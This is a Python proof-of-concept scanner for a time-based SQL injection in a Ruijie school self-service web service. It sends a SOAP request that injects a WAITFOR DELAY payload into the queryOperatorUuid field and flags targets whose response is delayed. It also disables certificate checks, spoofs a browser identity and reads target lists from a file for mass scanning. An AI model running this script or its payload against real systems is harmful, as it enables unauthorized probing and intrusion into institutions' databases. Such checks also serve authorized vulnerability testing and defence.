import requests
import urllib3
from urllib.parse import urljoin,quote
import argparse
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def check(url):
    url = url.rstrip("/")
    target = urljoin(url, "/selfservice/service/operatorReportorRoamService")
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
        "Content-Type":"text/xml"
    }
    data="""<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.webservice.common.spl.ruijie.com">
<soapenv:Header/>
    <soapenv:Body>
    <ser:queryOperatorUuid>
      <!--type: string-->
      <ser:in0>';WAITFOR DELAY '0:0:5'--</ser:in0>
    </ser:queryOperatorUuid>
    </soapenv:Body>
</soapenv:Envelope>"""
    try:
        response = requests.post(target, verify=False, data=data,headers=headers, timeout=15)
        res_time = response.elapsed.total_seconds()
        if response.status_code == 200 and 'soap' in response.text and '.ruijie' in response.text and 5<=res_time<=10:
                print(f"\033[31mDiscovered:{url}: RuiJie_Schoole_operatorReportorRoamService_SQLinject!\033[0m")
                return True
    except Exception as e:
        pass



if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")